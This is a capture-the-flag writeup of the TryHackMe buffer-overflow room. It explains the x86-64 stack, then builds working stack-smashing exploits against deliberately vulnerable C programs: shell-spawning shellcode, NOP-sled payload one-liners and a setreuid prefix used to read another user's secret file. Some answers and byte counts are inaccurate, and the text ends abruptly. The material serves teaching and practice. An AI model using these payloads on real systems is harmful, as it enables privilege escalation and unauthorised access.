::: {}
# Buffer Overflows Tryhackme Writeup {#buffer-overflows-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
Room link: https://tryhackme.com/room/bof1 Note: This room is for
Premium Members Only. who purchased THM premium membership.
:::

::::::: {.section .e-content field="body"}
:::::: {#3539 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Buffer Overflows Tryhackme Writeup {#9810 .graf .graf--h3 .graf--leading .graf--title name="9810"}

<figure id="04a5" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/0*XTQ_xf_r0y9EUA4O.png"
class="graf-image" data-image-id="0*XTQ_xf_r0y9EUA4O.png"
data-width="627" data-height="229" />
</figure>

**Room link:**
[https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/bof1"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

### Task 1. Introduction {#3cf0 .graf .graf--h3 .graf-after--p name="3cf0"}

In this room, we aim to explore simple stack buffer overflows(without
any mitigation's) on x86--64 linux programs. We will use
[radare2](https://github.com/radare/radare2){.markup--anchor
.markup--p-anchor data-href="https://github.com/radare/radare2"
rel="noopener ugc nofollow noopener" target="_blank"} (r2) to examine
the memory layout. You are expected to be familiar with x86 and r2 for
this room. Check the [intro to
x86--64](https://tryhackme.com/room/introtox8664){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/introtox8664"
rel="noopener ugc nofollow noopener" target="_blank"} room for any
pre-requisite knowledge.

We have included a virtual machine with all the resources to ensure you
have the correct environment and tools to follow along. To access the
machine via SSH, use the following credentials:

**Username:** user1

**Password:** user1password

### Task 2. Process Layout {#e900 .graf .graf--h3 .graf-after--p name="e900"}

When a program runs on a machine, the computer runs the program as a
process. Current computer architecture allows multiple processes to be
run concurrently(at the same time by a computer). While these processes
may appear to run at the same time, the computer actually switches
between the processes very quickly and makes it look like they are
running at the same time. Switching between processes is called a
context switch. Since each process may need different information to
run(e.g. The current instruction to execute), the operating system has
to keep track of all the information in a process. The memory in the
process is organised sequentially and has the following layout:

<figure id="d87d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-VjuoDnIRLc3dLkd.png"
class="graf-image" data-image-id="0*-VjuoDnIRLc3dLkd.png"
data-width="305" data-height="319" />
</figure>

[https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/bof1"
rel="noopener ugc nofollow noopener" target="_blank"}

- [User stack contains the information required to run the program. This
  information would include the current program counter, saved registers
  and more information(we will go into detail in the next section). The
  section after the user stack is unused memory and it is used in case
  the stack grows(downwards)]{#6d91}
- [Shared library regions are used to either statically/dynamically link
  libraries that are used by the program]{#b30c}
- [The heap increases and decreases dynamically depending on whether a
  program dynamically assigns memory. Notice there is a section that is
  unassigned above the heap which is used in the event that the size of
  the heap increases.]{#2cf6}
- [The program code and data stores the program executable and
  initialised variables.]{#b887}

**Question 1**. Where is dynamically allocated memory stored?

> ***Answer: heap***

**Question 2**. Where is information about functions(e.g. local
arguments) stored?

> ***Answer: stack***

### Task 3. x86--64 Procedures {#cb99 .graf .graf--h3 .graf-after--blockquote name="cb99"}

A program would usually comprise of multiple functions and there needs
to be a way of tracking which function has been called, and which data
is passed from one function to another. The stack is a region of
contiguous memory addresses and it is used to make it easy to transfer
control and data between functions. The top of the stack is at the
lowest memory address and the stack grows towards lower memory
addresses. The most common operations of the stack are:

**Pushing**: used to add data onto the stack

**Popping**: used to remove data from the stack

<figure id="7527" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*WxvllVKqbDos0Eex.png"
class="graf-image" data-image-id="0*WxvllVKqbDos0Eex.png"
data-width="299" data-height="492" />
</figure>

[https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/bof1"
rel="noopener ugc nofollow noopener" target="_blank"}

push var

This is the assembly instruction to push a value onto the stack. It does
the following:

- [Uses var or value stored in memory location of var]{#89e0}

<figure id="723a" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/0*wAZp1KFNvmUhD4pa.png"
class="graf-image" data-image-id="0*wAZp1KFNvmUhD4pa.png"
data-width="341" data-height="193" />
</figure>

- [Decrements the stack pointer(known as **rsp** ) by 8]{#33a4}
- [Writes above value to new location of **rsp** , which is now the top
  of the stack]{#7555}

<figure id="e39f" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/0*eEWTFAAAWMfVYlPZ.png"
class="graf-image" data-image-id="0*eEWTFAAAWMfVYlPZ.png"
data-width="337" data-height="255" />
</figure>

**pop var**

This is an assembly instruction to read a value and pop it off the
stack. It does the following:

- [Reads the value at the address given by the stack pointer]{#87f5}

Stack Bottom()

<figure id="b868" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*j1ayC9JWMX7r39ES.png"
class="graf-image" data-image-id="0*j1ayC9JWMX7r39ES.png"
data-width="237" data-height="215" />
</figure>

Stack Top(memory location 0x0)(**rsp** points here)

- [Increment the stack pointer by 8]{#a788}
- [Store the value that was read from **rsp** into var]{#9ca3}

<figure id="2cb0" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/0*zsOEPzf1nGHm70O8.png"
class="graf-image" data-image-id="0*zsOEPzf1nGHm70O8.png"
data-width="341" data-height="201" />
</figure>

It's important to note that the memory does not change when popping
values of the stack --- it is only the value of the stack pointer that
changes!

Each compiled program may include multiple functions, where each
function would need to store local variables, arguments passed to the
function and more. To make this easy to manage, each function has its
own separate stack frame, where each new stack frame is allocated when a
function is called, and deallocated when the function is complete.

<figure id="b76c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*bH0kb1WH1BY3FgOi.png"
class="graf-image" data-image-id="0*bH0kb1WH1BY3FgOi.png"
data-width="242" data-height="152" />
</figure>

This is easily explained using an example. Look at the two functions:

``` {#8071 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
int add(int a, int b){
int new = a + b;
return new;
}
int calc(int a, int b){
int final = add(a, b);
return final;
}
calc(4, 5)
```

**Question 1**. what direction does the stack grown(l for lower/h for
higher)

> ***Answer: l***

**Question 2.** what instruction is used to add data onto the stack?

> ***Answer: push***

### Task 4. Procedures Continued {#e5cb .graf .graf--h3 .graf-after--blockquote name="e5cb"}

The explanation assumes that the current point of execution is inside
the calc function. In this case calc is known as the caller function and
add is known as the callee function. The following presents the assembly
code inside the calc function

<figure id="dbc0" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*4QQpSI3i2ojQFqsT"
class="graf-image" data-image-id="0*4QQpSI3i2ojQFqsT" data-width="685"
data-height="388" />
</figure>

[https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/bof1"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="7c10" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*UUD7En6yLE1wcJW1.png"
class="graf-image" data-image-id="0*UUD7En6yLE1wcJW1.png"
data-width="264" data-height="126" />
</figure>

The add function is invoked using the call operand in assembly, in this
case callq sym.add. The call operand can either take a label as an
argument(e.g. A function name), or it can take a memory address as an
offset to the location of the start of the function in the form of call
\*value. Once the add function is invoked(and after it is completed),
the program would need to know what point to continue in the program. To
do this, the computer pushes the address of the next instruction onto
the stack, in this case the address of the instruction on the line that
contains movl %eax, local_4h. After this, the program would allocate a
stack frame for the new function, change the current instruction pointer
to the first instruction in the function, change the stack pointer(rsp)
to the top of the stack, and change the frame pointer(rbp) to point to
the start of the new frame.

<figure id="6626" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*xVWnYeq-OhCXfYWg"
class="graf-image" data-image-id="0*xVWnYeq-OhCXfYWg" data-width="644"
data-height="328" />
</figure>

[https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/bof1"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="09bf" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Ssl_Fw3RwdwDJZQi.png"
class="graf-image" data-image-id="0*Ssl_Fw3RwdwDJZQi.png"
data-width="203" data-height="196" />
</figure>

Once the function is finished executing, it will call the return
instruction(retq). This instruction will pop the value of the return
address of the stack, deallocate the stack frame for the add function,
change the instruction pointer to the value of the return address,
change the stack pointer(rsp) to the top of the stack and change the
frame pointer(rbp) to the stack frame of calc.

<figure id="1e58" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kYsxZ0N8NV_kB3s8.png"
class="graf-image" data-image-id="0*kYsxZ0N8NV_kB3s8.png"
data-width="201" data-height="125" />
</figure>

<figure id="acc4" class="graf graf--figure graf-after--figure">
<img src="https://cdn-images-1.medium.com/max/800/0*-Xhcy5S1DVrOTE_G"
class="graf-image" data-image-id="0*-Xhcy5S1DVrOTE_G" data-width="650"
data-height="358" />
</figure>

[https://tryhackme.com/room/bof1](https://tryhackme.com/room/bof1){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/bof1"
rel="noopener ugc nofollow noopener" target="_blank"}

Now that we've understood how control is transferred through functions,
let's look at how data is transferred.

In the above example, we save that functions take arguments. The calc
function takes 2 arguments(a and b). Upto 6 arguments for functions can
be stored in the following registers:

- [rdi]{#c38e}
- [rsi]{#8833}
- [rdx]{#9bcb}
- [rcx]{#f600}
- [r8]{#8173}
- [r9]{#a9b7}

**Note: rax is a special register that stores the return values of the
functions(if any).**

If a function has anymore arguments, these arguments would be stored on
the functions stack frame.

We can now see that a caller function may save values in their
registers, but what happens if a callee function also wants to save
values in the registers? To ensure the values are not overwritten, the
callee values first save the values of the registers on their stack
frame, use the registers and then load the values back into the
registers. The caller function can also save values on the caller
function frame to prevent the values from being overwritten. Here are
some rules around which registers are caller and callee saved:

- [rax is caller saved]{#b3ff}
- [rdi, rsi, rdx, rcx r8 and r9 are called saved(and they are usually
  arguments for functions)]{#a43f}
- [r10, r11 are caller saved]{#d9fd}
- [rbx, r12, r13, r14 are callee saved]{#458b}
- [rbp is also callee saved(and can be optionally used as a frame
  pointer)]{#b89c}
- [rsp is callee saved]{#67ed}

So far, this is a more thorough example of the run time stack:

<figure id="2e27" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*FG4MVUXRSek0p7DW.png"
class="graf-image" data-image-id="0*FG4MVUXRSek0p7DW.png"
data-width="652" data-height="372" />
</figure>

**Question 1**. What register stores the return address?

> ***Answer: rax***

### Task 5. Endianess {#63ed .graf .graf--h3 .graf-after--blockquote name="63ed"}

In the above programs, you can see that the binary information is
represented in hexadecimal format. Different architectures actually
represent the same hexadecimal number in different ways, and this is
what is referred to as Endianess. Let's take the value of 0x12345678 as
an example. Here the least significant value is the right most value(78)
while the most significant value is the left most value(12).

Little Endian is where the value is arranged from the least significant
byte to the most significant byte:

<figure id="430c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-OVMHU3z6VzwgnF8.png"
class="graf-image" data-image-id="0*-OVMHU3z6VzwgnF8.png"
data-width="649" data-height="76" />
</figure>

Big Endian is where the value is arranged from the most significant byte
to the least significant byte.

<figure id="693c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*r672jRku_s20fcbG.png"
class="graf-image" data-image-id="0*r672jRku_s20fcbG.png"
data-width="657" data-height="77" />
</figure>

Here, each "value" requires at least a byte to represent, as part of a
multi-byte object.

### Task 6. Overwriting Variables {#e42f .graf .graf--h3 .graf-after--p name="e42f"}

Now that we've looked at all the background information, let's explore
how the overflows actually work. If you take a look at the overflow-1
folder, you'll notice some C code with a binary program. Your goal is to
change the value of the integer variable.

<figure id="9487" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*404Z4-T__Mb2BdCn"
class="graf-image" data-image-id="0*404Z4-T__Mb2BdCn" data-width="580"
data-height="255" />
</figure>

From the C code you can see that the integer variable and character
buffer have been allocated next to each other --- since memory is
allocated in contiguous bytes, you can assume that the integer variable
and character buffer are allocated next to each other.

**Note: this may not always be the case. With how the compiler and stack
are configured, when variables are allocated, they would need to be
aligned to particular size boundaries(e.g. 8 bytes, 16 byte) to make it
easier for memory allocation/deallocation. So if a 12 byte array is
allocated where the stack is aligned for 16 bytes this is what the
memory would look like:**

<figure id="6856" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*C2qb0PTySrD0AMP4.png"
class="graf-image" data-image-id="0*C2qb0PTySrD0AMP4.png"
data-width="430" data-height="74" />
</figure>

the compiler would automatically add 4 bytes to ensure that the size of
the variable aligns with the stack size. From the image of the stack
above, we can assume that the stack frame for the main function looks
like this:

<figure id="cdc3" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*gjqc_8B8R7HEMOdv.png"
class="graf-image" data-image-id="0*gjqc_8B8R7HEMOdv.png"
data-width="311" data-height="296" />
</figure>

even though the stack grows downwards, when data is copied/written into
the buffer, it is copied from lower to higher addresess. Depending on
how data is entered into the buffer, it means that it's possible to
overwrite the integer variable. From the C code, you can see that the
gets function is used to enter data into the buffer from standard input.
The gets function is dangerous because it doesn't really have a length
check --- This would mean that you can enter more than 14 bytes of data,
which would then overwrite the integer variable.

Try run the C program in this folder to overwrite the above variable!

**Question 1**. What is the minimum number of characters needed to
overwrite the variable?

> ***Answer: 15***

### Task 7. Overwriting Function Pointers {#0291 .graf .graf--h3 .graf-after--blockquote name="0291"}

For this example, look at the overflow- 2 folder. Inside this folder,
you'll notice the following C code.

<figure id="6d8f" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*xzUEITfY3BJRsN6W"
class="graf-image" data-image-id="0*xzUEITfY3BJRsN6W" data-width="502"
data-height="443" />
</figure>

Similar to the example above, data is read into a buffer using the gets
function, but the variable above the buffer is not a pointer to a
function. A pointer, like its name implies, is used to point to a memory
location, and in this case the memory location is that of the normal
function. The stack is laid out similar to the example above, but this
time you have to find a way of invoking the special function(maybe using
the memory address of the function). Try invoke the special function in
the program.

Keep in mind that the architecture of this machine is little endian!

### Task 8. Buffer Overflows {#c64f .graf .graf--h3 .graf-after--p name="c64f"}

For this example, look at overflow-3 folder. Inside this folder, you'll
find the following C code.

``` {#cb6e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
#include <stdio.h>
#include <stdlib.h>void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

This example will cover some of the more interesting, and useful things
you can do with a buffer overflow. In the previous examples, we've seen
that when a program takes users controlled input, it may not check the
length, and thus a malicious user could overwrite values and actually
change variables.

In this example, in the copy_arg function we can see that the strcpy
function is copying input from a string(which is argv\[1\] which is a
command line argument) to a buffer of length 140 bytes. With the nature
of strcpy, it does not check the length of the data being input so here
it's also possible to overflow the buffer --- we can do something more
malicious here.

Let's take a look at what the stack will look like for the copy_arg
function(this stack excludes the stack frame for the strcpy function):

<figure id="a1ec" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kCjYp3KlOH9jHQNe.png"
class="graf-image" data-image-id="0*kCjYp3KlOH9jHQNe.png"
data-width="333" data-height="233" />
</figure>

Earlier, we saw that when a function(in this case main) calls another
function(in this case copy_args), it needs to add the return address on
the stack so the callee function(copy_args) knows where to transfer
control to once it has finished executing. From the stack above, we know
that data will be copied upwards from buffer\[0\] to buffer\[140\].
Since we can overflow the buffer, it also follows that we can overflow
the return address with our own value. **We can control where the
function returns and change the flow of execution of a program(very
cool, right?)**

Know that we know we can control the flow of execution by directing the
return address to some memory address, how do we actually do something
useful with this. This is where shellcode comes in; shell code quite
literally is code that will open up a shell. More specifically, it is
binary instructions that can be executed. Since shellcode is just
machine code(in the form of binary instructions), you can usually start
of by writing a C program to do what you want, compile it into assembly
and extract the hex characters(alternatively it would involve writing
your own assembly). For now we'll use this shellcode that opens up a
basic shell:

``` {#fbfa .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05
```

So why don't we looking at actually executing this shellcode. The basic
idea is that we need to point the overwritten return address to the
shellcode, but where do we actually store the shellcode and what actual
address do we point it at? Why don't we store the shellcode in the
buffer --- because we know the address at the beginning of the buffer,
we can just overwrite the return address to point to the start of the
buffer. Here's the general process so far:

- [Find out the address of the start of the buffer and the start address
  of the return address]{#ee06}
- [Calculate the difference between these addresses so you know how much
  data to enter to overflow]{#c080}
- [Start out by entering the shellcode in the buffer, entering random
  data between the shellcode and the return address, and the address of
  the buffer in the return address]{#d957}

<figure id="a065" class="graf graf--figure graf-after--li">
<img
src="https://cdn-images-1.medium.com/max/800/0*xY-bOCIzSPuzb5Hu.png"
class="graf-image" data-image-id="0*xY-bOCIzSPuzb5Hu.png"
data-width="325" data-height="217" />
</figure>

In theory, this looks like it would work quite well. However, memory
addresses may not be the same on different systems, even across the same
computer when the program is recompiled. So we can make this more
flexible using a NOP instruction. A NOP instruction is a no operation
instruction --- when the system processes this instruction, it does
nothing, and carries on execution. A NOP instruction is represented
using \\x90. Putting NOPs as part of the payload means an attacker can
jump anywhere in the memory region that includes a NOP and eventually
reach the intended instructions. This is what an injection vector would
look like:

<figure id="e55c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*5lyevWYtSDF_FyG5.png"
class="graf-image" data-image-id="0*5lyevWYtSDF_FyG5.png"
data-width="641" data-height="58" />
</figure>

You've probably noticed that shellcode, memory addresses and NOP sleds
are usually in hex code. To make it easy to pass the payload to an input
program, you can use python:

``` {#ba30 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
```

Using this format would be something like this for this challenge:

``` {#4c8a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' +
'\x41' * 60 +
'\xef\xbe\xad\xde') | ./program_name
"
```

In some cases you may need to pass xargs before ./program_name.

**Question 1**. Use the above method to open a shell and read the
contents of the secret.txt file.

<figure id="d8eb" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dRjnF-XyCobw7Kgn.png"
class="graf-image" data-image-id="0*dRjnF-XyCobw7Kgn.png"
data-width="535" data-height="160" />
</figure>

``` {#95fa .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
run $(python -c "print('A'*158)")
```

<figure id="d46b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*KvG-evcpGtmZr4XB.png"
class="graf-image" data-image-id="0*KvG-evcpGtmZr4XB.png"
data-width="804" data-height="416" />
</figure>

Hexadecimal value of A is 41

``` {#7f04 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
run $(python -c "print('A'*159)")
```

<figure id="1d9a" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*OCEX6lY1yGCoto_6.png"
class="graf-image" data-image-id="0*OCEX6lY1yGCoto_6.png"
data-width="799" data-height="298" />
</figure>

So we know that with 158 bytes we override the 6-bytes-long return
address. It means our offset to reach the start of the return address is
158--6 = **152**

**shellcode**

After many attempts, all failing with an "Illegal instruction" error, I
found a shellcode (40 bytes) that works here:
[https://www.arsouyes.org/blog/2019/54_Shellcode/](https://www.arsouyes.org/blog/2019/54_Shellcode/){.markup--anchor
.markup--p-anchor
data-href="https://www.arsouyes.org/blog/2019/54_Shellcode/"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#d33a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
shellcode = '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
```

<figure id="b50d" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*on6Ee1nQgwsF_k5A.png"
class="graf-image" data-image-id="0*on6Ee1nQgwsF_k5A.png"
data-width="805" data-height="268" />
</figure>

**Return address**

The last item we need to complete our payload is the return address of
the shell code (6 bytes). Our payload will be like this:

<figure id="5262" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uREAbWRDFQWownW7.png"
class="graf-image" data-image-id="0*uREAbWRDFQWownW7.png"
data-width="715" data-height="82" />
</figure>

``` {#857f .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ini"}
payload = '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6
```

<figure id="f52d" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*luSQ1WXE3W8EiHDD.png"
class="graf-image" data-image-id="0*luSQ1WXE3W8EiHDD.png"
data-width="805" data-height="149" />
</figure>

Let's try that:

``` {#01d6 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
run $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6)")
```

<figure id="05e9" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*sOCbivy8bwgoCgA0.png"
class="graf-image" data-image-id="0*sOCbivy8bwgoCgA0.png"
data-width="875" data-height="202" />
</figure>

See where NOP sled string is located, and beginning of shellcode.

``` {#a507 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
x/100x $rsp-200
```

<figure id="9d36" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*Uzg24FN3cNh8qhBf.png"
class="graf-image" data-image-id="0*Uzg24FN3cNh8qhBf.png"
data-width="671" data-height="489" />
</figure>

Let's take any address between the NOP sled and the shellcode (e.g.
**0x7fffffffe298**). Here is the final payload:

``` {#6c47 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
./buffer-overflow $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x98\xe2\xff\xff\xff\x7f')")
```

When executed, the programs eventually spawns a shell.

As you can see above, we are not allowed to access the secret though,
because we are not user2.

**setreuid**

Let's use pwntools to generate a prefix to our shellcode to run
SETREUID:

``` {#8556 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
apt-get update
apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
```

<figure id="fd68" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*h_RXj6-wk9vL9_QX.png"
class="graf-image" data-image-id="0*h_RXj6-wk9vL9_QX.png"
data-width="589" data-height="90" />
</figure>

``` {#69b9 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="python-repl"}
$ python
>>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
14
```

Our payload now looks like this:

<figure id="d9f2" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*5xW4CAlmPBLRFWOx.png"
class="graf-image" data-image-id="0*5xW4CAlmPBLRFWOx.png"
data-width="875" data-height="84" />
</figure>

Let's test:

``` {#d7f7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x98\xe2\xff\xff\xff\x7f')")
```

<figure id="6526" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*RcDGwF-RNajLKJy-.png"
class="graf-image" data-image-id="0*RcDGwF-RNajLKJy-.png"
data-width="875" data-height="162" />
</figure>

### Task 9. Buffer Overflow 2 {#9a10 .graf .graf--h3 .graf-after--figure name="9a10"}

Look at the overflow-4 folder. Try to use your newly learnt buffer
overflow techniques for this binary file.

**Question** **1**. Use the same method to read the contents of the
secret file!

Below is the code for buffer-overflow-2.c

``` {#d0a8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
#include <stdio.h>
#include <stdlib.h>void concat_arg(char *string)
{
    char buffer[154] = "doggo";
    strcat(buffer, string);
    printf("new word is %s\n", buffer);
    return 0;
}int main(int argc, char **argv)
{
    concat_arg(argv[1]);
}
```

Run:

<figure id="3e20" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4RYlpzm7NEawPRHS.png"
class="graf-image" data-image-id="0*4RYlpzm7NEawPRHS.png"
data-width="672" data-height="135" />
</figure>

**offset**

The buffer is 154 bytes, but the string `doggo`{.markup--code
.markup--p-code} (5 characters) is added. So we should begin to test
from 154-5. Let's start with 8 more bytes:

``` {#c86e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
gdb -q buffer-overflow-2
run $(python -c "print('A'*(154-5+8*2+4))")
```

<figure id="039b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*pTIiarOraKRHRzV4.png"
class="graf-image" data-image-id="0*pTIiarOraKRHRzV4.png"
data-width="798" data-height="311" />
</figure>

The offset is 169 (154--5+8\*2+4).

**Shellcode**

We'll use the same shellcode (158 bytes) as previously, with the
SETREUID. This time, we need to target user3 (ID is 1003), to be able to
read `secret.txt`{.markup--code .markup--p-code}:

<figure id="f60e" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-D8h02L6G0M8_XSt.png"
class="graf-image" data-image-id="0*-D8h02L6G0M8_XSt.png"
data-width="658" data-height="199" />
</figure>

``` {#60ed .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
pwn shellcraft -f d amd64.linux.setreuid 1003
```

<figure id="67b1" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*VKiBrd5dbVFtapij.png"
class="graf-image" data-image-id="0*VKiBrd5dbVFtapij.png"
data-width="588" data-height="92" />
</figure>

``` {#77d3 .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
```

> *31ff66bfeb036a71584889fe0f05*

``` {#a255 .graf .graf--pre .graf-after--blockquote .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="go"}
python >>> len(‘3166036a715848890f05’) 
14>>> shellcode = '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'>>> len(shellcode)
40
```

**Return address**

Now, let's have a look at our payload. It should look like this:

<figure id="e1b4" class="graf graf--figure graf-after--p">
<img
